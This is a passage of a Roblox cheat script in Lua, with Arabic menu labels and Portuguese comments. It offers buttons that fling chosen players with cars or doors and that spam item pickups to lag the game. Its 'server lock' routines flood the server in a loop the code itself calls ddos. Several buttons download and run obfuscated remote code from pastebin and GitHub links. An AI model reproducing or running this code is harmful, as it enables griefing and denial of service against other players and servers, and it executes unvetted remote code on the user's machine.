        local TargetC, TargetH, TargetRP = getTargetInfo()

        local attachment = Instance.new("Attachment", TargetRP)
        local force = Instance.new("BodyVelocity")
        force.Velocity = Vector3.new(1e9, 1e9, 1e9)
        force.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        force.P = 500
        force.Parent = attachment

        for _, part in ipairs(PCar:GetDescendants()) do
            if part:IsA("BasePart") then
                local bv = Instance.new("BodyVelocity")
                bv.Velocity = Vector3.new(1e9, 1e9, 1e9)
                bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                bv.P = 500
                bv.Parent = part
            end
        end

        local Angles = 0
        local YRotation = 0

        while PCar.Parent do
            task.wait()
            Angles += 100
            YRotation += 5000
            local Rotation = CFrame.Angles(math.rad(Angles), math.rad(YRotation), 0)

            if not (TargetC and TargetH and TargetRP and TargetRP.Parent) then
                TargetC, TargetH, TargetRP = getTargetInfo()
                if attachment then attachment:Destroy() end
                if force then force:Destroy() end
                attachment = Instance.new("Attachment", TargetRP)
                force = Instance.new("BodyVelocity")
                force.Velocity = Vector3.new(1e9, 1e9, 1e9)
                force.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                force.P = 500
                force.Parent = attachment
            end

            local function flingAttack(offset)
                local newPos = TargetRP.Position + offset + (TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.1)
                local newCF = CFrame.new(newPos) * Rotation
                PCar:SetPrimaryPartCFrame(newCF)
            end

            flingAttack(Vector3.new(0, 1, 0))
            flingAttack(Vector3.new(0, -2.25, 5))
            flingAttack(Vector3.new(0, 2.25, 0.25))
            flingAttack(Vector3.new(-2.25, -1.5, 2.25))
            flingAttack(Vector3.new(0, 1.5, 0))
            flingAttack(Vector3.new(0, -1.5, 0))
        end

        if attachment then attachment:Destroy() end
        if force then force:Destroy() end
        Humanoid.Sit = false
        task.wait(0.1)
        if OldPos then RootPart.CFrame = OldPos end
    end
})

Tab:AddButton({
    Name = "فلينق ابواب",
    Callback = function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local RunService = game:GetService("RunService")

        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local HRP = Character:WaitForChild("HumanoidRootPart")

        -- Alvo invisível (BlackHole)
        local BlackHole = Instance.new("Part")
        BlackHole.Size = Vector3.new(100000, 100000, 100000)
        BlackHole.Transparency = 1
        BlackHole.Anchored = true
        BlackHole.CanCollide = false
        BlackHole.Name = "BlackHoleTarget"
        BlackHole.Parent = Workspace

        -- Attachment base no BlackHole
        local baseAttachment = Instance.new("Attachment")
        baseAttachment.Name = "BlackHoleAttachment"
        baseAttachment.Parent = BlackHole

        -- Atualiza posição do BlackHole
        local updateConn = RunService.Heartbeat:Connect(function()
            BlackHole.CFrame = HRP.CFrame
        end)

        -- Lista de portas controladas
        local ControlledDoors = {}

        -- Prepara uma porta para ser controlada
        local function SetupPart(part)
            if not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end
            if part:FindFirstChild("Attached") then return end

            part.CanCollide = false

            for _, obj in ipairs(part:GetChildren()) do
                if obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") then
                    obj:Destroy()
                end
            end

            local marker = Instance.new("BoolValue", part)
            marker.Name = "Attached"

            local a1 = Instance.new("Attachment", part)

            local align = Instance.new("AlignPosition", part)
            align.Attachment0 = a1
            align.Attachment1 = baseAttachment
            align.MaxForce = 1e20
            align.MaxVelocity = math.huge
            align.Responsiveness = 99999

            local torque = Instance.new("Torque", part)
            torque.Attachment0 = a1
            torque.RelativeTo = Enum.ActuatorRelativeTo.World
            torque.Torque = Vector3.new(
                math.random(-10e5, 10e5) * 10000,
                math.random(-10e5, 10e5) * 10000,
                math.random(-10e5, 10e5) * 10000
            )

            table.insert(ControlledDoors, {Part = part, Align = align})
        end

        -- Detecta e prepara portas existentes
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
                SetupPart(obj)
            end
        end

        -- Novas portas no futuro
        local descendantConn = Workspace.DescendantAdded:Connect(function(obj)
            if obj:IsA("BasePart") and string.find(obj.Name, "Door") then
                SetupPart(obj)
            end
        end)

        -- Função para flingar jogador
        local function FlingPlayerByName(name)
            local player = Players:FindFirstChild(name)
            if not player or player == LocalPlayer then
                warn("[LOLBOTER system] Jogador inválido ou não encontrado.")
                return
            end

            local char = player.Character
            if not char then return end
            local targetHRP = char:FindFirstChild("HumanoidRootPart")
            if not targetHRP then return end

            local targetAttachment = targetHRP:FindFirstChild("TargetAttachment")
            if not targetAttachment then
                targetAttachment = Instance.new("Attachment", targetHRP)
                targetAttachment.Name = "TargetAttachment"
            end

            for _, data in ipairs(ControlledDoors) do
                if data.Align then
                    data.Align.Attachment1 = targetAttachment
                end
            end

            local start = tick()
            local flingDetected = false

            while tick() - start < 5 do
                if targetHRP.Velocity.Magnitude >= 20 then
                    flingDetected = true
                    break
                end
                RunService.Heartbeat:Wait()
            end

            -- Sempre retorna as portas
            for _, data in ipairs(ControlledDoors) do
                if data.Align then
                    data.Align.Attachment1 = baseAttachment
                end
            end

            print("[LOLBOTER system] Ataque finalizado em:", player.Name, flingDetected and "Flingado" or "Sem Fling")
        end

        -- Verifica se um player foi selecionado
        if selectedPlayer then
            FlingPlayerByName(selectedPlayer)
        else
            warn("[LOLBOTER system] Nenhum jogador selecionado no dropdown.")
        end

        -- Duração máxima de 50 segundos
        task.delay(50, function()
            for _, data in ipairs(ControlledDoors) do
                if data.Align then
                    data.Align:Destroy()
                end
                if data.Part:FindFirstChild("Attached") then
                    data.Part.Attached:Destroy()
                end
                for _, obj in ipairs(data.Part:GetChildren()) do
                    if obj:IsA("Attachment") or obj:IsA("Torque") then
                        obj:Destroy()
                    end
                end
            end

            if BlackHole then
                BlackHole:Destroy()
            end

            if updateConn then
                updateConn:Disconnect()
            end

            if descendantConn then
                descendantConn:Disconnect()
            end

            print("-LOLBOTER Fling com portas encerrado após 50 segundos.")
        end)
    end
})

Tab:AddSection({Name = "الكل"})

Tab:AddButton({
  Name = "فلينق ابواب للكل",
  Callback = function()
  loadstring(game:HttpGet("https://pastebin.com/raw/PfMGmdQ2"))()
  end
})

Tab:AddButton({
    Name = "فلينق قارب للكل",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/1mNMv6Y1"))()
    end
})

Tab:AddButton({
    Name = "فلينق كنبه للكل",
    Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/NnhZmEdS"))()
    end
})

Tab:AddButton({
    Name = "طرد من البيت للكل",
    Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/8UXYnedy"))()
    end
})

local Tab = Window:MakeTab({"مميزات لاق و المزيد"})

Tab:AddSection({ "ادوات الاق" })

local BNumber = 2000 -- Initial default value

Toggle = Tab:AddToggle({
    Name = "سبام كرة السلة",
    Default = false,
    Callback = function(Value)
        BasketToggleH = Value
        if BasketToggleH then
            local Player = game.Players.LocalPlayer
            local Backpack = Player.Backpack
            local Mouse = Player:GetMouse()
            local Character = Player.Character
            local Humanoid = Character:FindFirstChildOfClass("Humanoid")
            local RootPart = Character:FindFirstChild("HumanoidRootPart")
            local OldPosition = RootPart.CFrame
            local Clone = Workspace.WorkspaceCom["001_GiveTools"].Basketball

            for i = 1, BNumber do
                task.wait()
                RootPart.CFrame = Clone.CFrame
                fireclickdetector(Clone.ClickDetector)
            end
            task.wait()
            RootPart.CFrame = OldPosition

            while BasketToggleH do
                task.wait()
                for i, v in ipairs(Character:GetChildren()) do
                    if v.Name == "Basketball" then
                        task.wait()
                        local args = {
                            [1] = Mouse.Hit.p
                        }
                        v.ClickEvent:FireServer(unpack(args))
                    end
                end
            end
        end
    end
})

local Slider = Tab:AddSlider({
    Name = "عدد كرات السلة",
    MinValue = 1,
    MaxValue = 2000, -- Adjust as needed
    Default = BNumber,
    Increase = 1,
    Callback = function(Value)
        BNumber = Value
    end
})

local BNumber = 12  -- Valor padrÃ£o inicial para a quantidade de duplicaÃ§Ãµes

-- Adiciona um TextBox para inserir a quantidade de itens a serem duplicados
local Slider = Tab:AddTextBox({
    Name = "ضع عدد نسخ اليزر",
    Default = tostring(BNumber),
    Callback = function(Value)
        BNumber = tonumber(Value) or BNumber  -- Atualiza o valor de BNumber com o que o usuÃ¡rio inseriu
    end
})

local loopEnabled = false

local Toggle = Tab:AddToggle({
    Name = "لاق سلاح اليزر",
    Description = "يحتاج تقريبا من 20 الى 25 ثانية",
    Default = false,
    Callback = function(Value)
        loopEnabled = Value

        if loopEnabled then
            warn("Lag Taser Ativado")

            local function duplicarTaser()
                local Player = game.Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local RootPart = Character:WaitForChild("HumanoidRootPart")
                local Taser = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")
                    and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("Taser")

                if Taser and Taser:FindFirstChild("ClickDetector") then
                    local OldPos = RootPart.CFrame

                    for i = 1, 12 do
                        RootPart.CFrame = Taser.CFrame
                        fireclickdetector(Taser.ClickDetector)
                        task.wait()
                    end

                    RootPart.CFrame = OldPos
                else
                    warn("Erro ao encontrar o Taser! Tente novamente.")
                end
            end

            task.spawn(function()
                while loopEnabled do
                    duplicarTaser()
                    task.wait(0.001)
                end
            end)
        else
            warn("Lag Taser Desativado")
        end
    end
})

local BNumber = 9e9
local LaptopLoop = false

Tab:AddToggle({
    Name = "لاق الابتوب",
    Description = "يحتاج تقريبا من 20 الى 25 ثانيه",
    Default = false,
    Callback = function(Value)
        LaptopLoop = Value

        if LaptopLoop then
            warn("Lag Laptop Ativado")

            task.spawn(function()
                local Player = game.Players.LocalPlayer 
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local RootPart = Character:WaitForChild("HumanoidRootPart")
                local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
                    and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
                    and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("Laptop")

                if not (Clone and Clone:FindFirstChild("ClickDetector")) then
                    warn("Laptop ou ClickDetector não encontrado!")
                    return
                end

                local OldPos = RootPart.CFrame
                local processed = 0
                local iterationsPerFrame = 500

                -- Loop controlado por Heartbeat
                local connection
                connection = game:GetService("RunService").Heartbeat:Connect(function()
                    if not LaptopLoop then
                        connection:Disconnect()
                        RootPart.CFrame = OldPos
                        warn("Lag Laptop Desativado")
                        return
                    end

                    for i = 1, iterationsPerFrame do
                        if processed < BNumber then
                            RootPart.CFrame = Clone.CFrame
                            fireclickdetector(Clone.ClickDetector)
                            processed += 1
                        else
                            connection:Disconnect()
                            RootPart.CFrame = OldPos
                            warn("Finalizado spam do Laptop.")
                            return
                        end
                    end
                end)
            end)
        else
            -- Apenas para feedback instantâneo
            warn("Lag Laptop Desativado")
        end
    end
})

local BookLoop = false

Tab:AddToggle({
    Name = "لاق كتاب",
    Description = "يحتاج من 20 الى 25 ثانيه",
    Default = false,
    Callback = function(Value)
        BookLoop = Value

        if BookLoop then
            warn("Lag Book Ativado")

            task.spawn(function()
                local Player = game.Players.LocalPlayer
                local Character = Player.Character or Player.CharacterAdded:Wait()
                local RootPart = Character:WaitForChild("HumanoidRootPart")
                local Book = game:GetService("Workspace")
                    :FindFirstChild("WorkspaceCom")
                    and game.Workspace.WorkspaceCom["001_DayCare"].Tools:FindFirstChild("Book")

                if not (Book and Book:FindFirstChild("ClickDetector")) then
                    warn("Erro ao encontrar o Book! Tente novamente.")
                    return
                end

                local OldPos = RootPart.CFrame

                while BookLoop do
                    for i = 1, 12 do
                        if not BookLoop then break end
                        RootPart.CFrame = Book.CFrame
                        fireclickdetector(Book.ClickDetector)
                        task.wait(0)
                    end
                    RootPart.CFrame = OldPos
                    task.wait(0.001)
                end

                RootPart.CFrame = OldPos
                warn("Lag Book Desativado")
            end)

        else
            warn("Lag Book Desativado")
        end
    end
})

local Section = Tab:AddSection({"ادوات الحيط"})

local BNumber = 600 -- Valor fixo
local distanciaEntreItens = 3 -- DistÃ¢ncia entre os itens ao longo do bastÃ£o

-- FunÃ§Ã£o para organizar itens em forma de bastÃ£o gigante para baixo
local function organizarItensEmBastaoParaBaixo()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player.Backpack
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- Coleta todos os Tools no personagem e na mochila
    local itens = {}

    -- Procura Tools no personagem
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end

    -- Procura Tools na mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end

    -- Verifica duplicatas e organiza por nome
    local duplicatas = {}
    for _, item in pairs(itens) do
        if not duplicatas[item.Name] then
            duplicatas[item.Name] = {}
        end
        table.insert(duplicatas[item.Name], item)
    end

    -- Para cada grupo de duplicatas, organize-os em formato de bastÃ£o
    local yOffset = 0 -- Offset inicial no eixo Y
    for _, grupo in pairs(duplicatas) do
        local total = #grupo
        if total > 1 then
            for i, item in pairs(grupo) do
                -- Equipa o item para ajustar o GripPos
                item.Parent = character

                -- Define a posiÃ§Ã£o vertical para o item no bastÃ£o (para baixo no eixo Y)
                item.GripPos = Vector3.new(0, -yOffset, 0)

                -- Incrementa o offset no eixo Y para "descer"
                yOffset = yOffset + distanciaEntreItens

                -- Aguarda um pouco para o efeito ser visÃ­vel
                task.wait()

                -- Solta o item colocando de volta na mochila
                item.Parent = backpack
            end
        end
    end

    -- Equipa todos os itens "FireX" da mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            item.Parent = character
        end
    end
end


Tab:AddButton({
  Name = "لاق اداه اطفاء الحريق قوي",
  Callback = function()
    local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")

        -- AtualizaÃ§Ã£o da hierarquia para FireX
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
            and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posiÃ§Ã£o original

            -- Loop para pegar os itens repetidamente
            local processed = 0
            while processed < BNumber do
                RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone
                fireclickdetector(Clone.ClickDetector) -- Clica no detector
                processed = processed + 1
                task.wait() -- Pausa para evitar travamento
            end

            -- Retorna Ã  posiÃ§Ã£o original
            RootPart.CFrame = OldPos

            -- Executa a funÃ§Ã£o de organizaÃ§Ã£o ao final do loop
            organizarItensEmBastaoParaBaixo()
        else
            warn("FireX ou ClickDetector nÃ£o encontrado!")
        end
  end
})


local BNumber = 600 -- Valor fixo
local raioCirculo = 5 -- DistÃ¢ncia do cÃ­rculo em relaÃ§Ã£o ao personagem

-- FunÃ§Ã£o para organizar itens em formato de cÃ­rculo
local function organizarItensEmCirculo()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player.Backpack
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Coleta todos os Tools no personagem e na mochila  
local itens = {}  
  
-- Procura Tools no personagem  
for _, item in pairs(character:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        table.insert(itens, item)  
    end  
end  
  
-- Procura Tools na mochila  
for _, item in pairs(backpack:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        table.insert(itens, item)  
    end  
end  
  
-- Verifica duplicatas e organiza por nome  
local duplicatas = {}  
for _, item in pairs(itens) do  
    if not duplicatas[item.Name] then  
        duplicatas[item.Name] = {}  
    end  
    table.insert(duplicatas[item.Name], item)  
end  
  
-- Para cada grupo de duplicatas, organize-os em formato de cÃ­rculo  
for _, grupo in pairs(duplicatas) do  
    local total = #grupo  
    if total > 1 then  
        for i, item in pairs(grupo) do  
            -- Equipa o item para ajustar o GripPos  
            item.Parent = character  
              
            -- Calcula o Ã¢ngulo de cada item no cÃ­rculo  
            local angulo = (i / total) * (2 * math.pi)  
              
            -- Calcula a posiÃ§Ã£o circular atrÃ¡s do jogador  
            local offsetX = math.cos(angulo) * raioCirculo  
            local offsetZ = math.sin(angulo) * raioCirculo  
              
            -- Define a posiÃ§Ã£o atrÃ¡s do HumanoidRootPart  
            item.GripPos = Vector3.new(-offsetX, 0, -offsetZ - raioCirculo)  
              
            -- Aguarda um pouco para o efeito ser visÃ­vel  
            task.wait()  
              
            -- Solta o item colocando de volta na mochila  
            item.Parent = backpack  
        end  
    end  
end  
  
-- Equipa todos os itens "FireX" da mochila  
for _, item in pairs(backpack:GetChildren()) do  
    if item:IsA("Tool") and item.Name == "FireX" then  
        item.Parent = character  
    end  
end

end


Tab:AddButton({
  Name = "لاق اداه اطفاء حريق قوي 2",
  Callback = function()
    local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local RootPart = Character:WaitForChild("HumanoidRootPart")

-- AtualizaÃ§Ã£o da hierarquia para FireX  
    local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom")   
        and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")  
        and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")  

    if Clone and Clone:FindFirstChild("ClickDetector") then  
        local OldPos = RootPart.CFrame -- Armazena a posiÃ§Ã£o original  

        -- Loop para pegar os itens repetidamente  
        local processed = 0  
        while processed < BNumber do  
            RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone  
            fireclickdetector(Clone.ClickDetector) -- Clica no detector  
            processed = processed + 1  
            task.wait() -- Pausa para evitar travamento  
        end  

        -- Retorna Ã  posiÃ§Ã£o original  
        RootPart.CFrame = OldPos   

        -- Executa a funÃ§Ã£o de organizaÃ§Ã£o ao final do loop  
        organizarItensEmCirculo()  
    else  
        warn("FireX ou ClickDetector nÃ£o encontrado!")  
    end  
  end
})


local BNumber = 600 -- Valor fixo
local distanciaAtras = 5 -- DistÃ¢ncia da parede em relaÃ§Ã£o ao personagem
local espacamentoX = 3 -- EspaÃ§amento horizontal entre itens
local espacamentoY = 3 -- EspaÃ§amento vertical entre itens

-- FunÃ§Ã£o para organizar itens em formato de parede
local function organizarItensEmParede()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local backpack = player.Backpack
    local rootPart = character:WaitForChild("HumanoidRootPart")

    -- Coleta todos os Tools no personagem e na mochila
    local itens = {}
    
    -- Procura Tools no personagem
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end
    
    -- Procura Tools na mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            table.insert(itens, item)
        end
    end
    
    -- Verifica duplicatas e organiza por nome
    local duplicatas = {}
    for _, item in pairs(itens) do
        if not duplicatas[item.Name] then
            duplicatas[item.Name] = {}
        end
        table.insert(duplicatas[item.Name], item)
    end
    
    -- Organiza os itens em formato de parede
    for _, grupo in pairs(duplicatas) do
        local total = #grupo
        
        -- Calcula o nÃºmero de colunas e linhas necessÃ¡rias
        local colunas = math.ceil(math.sqrt(total))
        local linhas = math.ceil(total / colunas)
        
        for i, item in pairs(grupo) do
            -- Calcula a posiÃ§Ã£o na grade
            local linha = math.floor((i-1) / colunas)
            local coluna = (i-1) % colunas
            
            -- Equipa o item para ajustar o GripPos
            item.Parent = character
            
            -- Ajusta a posiÃ§Ã£o na parede atrÃ¡s do jogador
            item.GripPos = Vector3.new(coluna * espacamentoX, -linha * espacamentoY, -distanciaAtras)
            
            -- Aguarda um pouco para o efeito ser visÃ­vel
            task.wait()
            
            -- Solta o item colocando de volta na mochila
            item.Parent = backpack
        end
    end
    
    -- Equipa todos os itens "FireX" da mochila
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA("Tool") and item.Name == "FireX" then
            item.Parent = character
        end
    end
end


local Button = Tab:AddButton({
  Name = "جدار اداه اطفاء الحرائق",
  Callback = function()
    local Player = game.Players.LocalPlayer 
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        
        -- AtualizaÃ§Ã£o da hierarquia para FireX
        local Clone = game:GetService("Workspace"):FindFirstChild("WorkspaceCom") 
            and game:GetService("Workspace").WorkspaceCom:FindFirstChild("001_GiveTools")
            and game:GetService("Workspace").WorkspaceCom["001_GiveTools"]:FindFirstChild("FireX")

        if Clone and Clone:FindFirstChild("ClickDetector") then
            local OldPos = RootPart.CFrame -- Armazena a posiÃ§Ã£o original

            -- Loop para pegar os itens repetidamente
            local processed = 0
            while processed < BNumber do
                RootPart.CFrame = Clone.CFrame -- Teletransporta para o clone
                fireclickdetector(Clone.ClickDetector) -- Clica no detector
                processed = processed + 1
                task.wait() -- Pausa para evitar travamento
            end

            -- Retorna Ã  posiÃ§Ã£o original
            RootPart.CFrame = OldPos 

            -- Executa a funÃ§Ã£o de organizaÃ§Ã£o ao final do loop
            organizarItensEmParede()
        else
            warn("FireX ou ClickDetector nÃ£o encontrado!")
        end
  end
})

local Toggle = Tab:AddToggle({
  Name = "بلاك رول",
  Default = false,
  Callback = function(Value)
    if Value then
            -- Quando a toggle estiver ativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Tornado/raw/refs/heads/main/TornadoObfuscate.txt"))()
        else
            -- Quando a toggle estiver desativada
            loadstring(game:HttpGet("https://github.com/TemplariosScripts1/Blackhole2/raw/refs/heads/main/Blackhole2Obfuscate.txt"))()
        end
  end
})

local Section = Tab:AddSection({"تقفيل السيرفر بيتا"})

Tab:AddButton({
  Name = "تقفيل السيرفر اداه اطفاء الحريق قوي",
  Callback = function()
          local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(5)

        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r✅️جار قفل السيرفر✅️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
    end
    
    tools = "FireX"
		lagserver = true
		if game:GetService("Workspace"):FindFirstChild("Camera") then
			game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
			wait(0.1)
		if game:GetService("Workspace"):FindFirstChild("Camera") then
		game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.CFrame + Vector3.new(0,-15,0)
task.wait(0.2)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
ddos = true
		for i=1, 425 do task.wait()
			if ddos == false then
				local args = {
					[1] = "ClearAllTools"
				}
				
				cleartoolremote:FireServer(unpack(args))
				 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,-475,9999)
				 return
			end
			if game:GetService("Workspace"):FindFirstChild("Camera") then
				game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
				if game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools) then
					game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools):Destroy() end
					if ddos == false then return end
			fireclickdetector(game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.ClickDetector,0)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,-475,0)
			wait()
			lagserver = false
  end
})


Tab:AddButton({
  Name = "تقفيل السيرفر قوي V2",
  Callback = function()
          local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r⚠️تحذير سيتم قفل السيرفر⚠️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(5)

        local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r✅️جار قفل السيرفر✅️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
    end
    
    tools = "Iphone"
		lagserver = true
		if game:GetService("Workspace"):FindFirstChild("Camera") then
			game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
			wait(0.1)
		if game:GetService("Workspace"):FindFirstChild("Camera") then
		game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.CFrame + Vector3.new(0,-15,0)
task.wait(0.2)
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
ddos = true
		for i=1, 425 do task.wait()
			if ddos == false then
				local args = {
					[1] = "ClearAllTools"
				}
				
				cleartoolremote:FireServer(unpack(args))
				 game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
				 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(9999,-475,9999)
				 return
			end
			if game:GetService("Workspace"):FindFirstChild("Camera") then
				game:GetService("Workspace"):FindFirstChild("Camera"):Destroy() end
				if game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools) then
					game:GetService("Players").LocalPlayer.Character:FindFirstChild(tools):Destroy() end
					if ddos == false then return end
			fireclickdetector(game:GetService("Workspace").WorkspaceCom["001_GiveTools"].FireX.ClickDetector,0)
			end
			game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
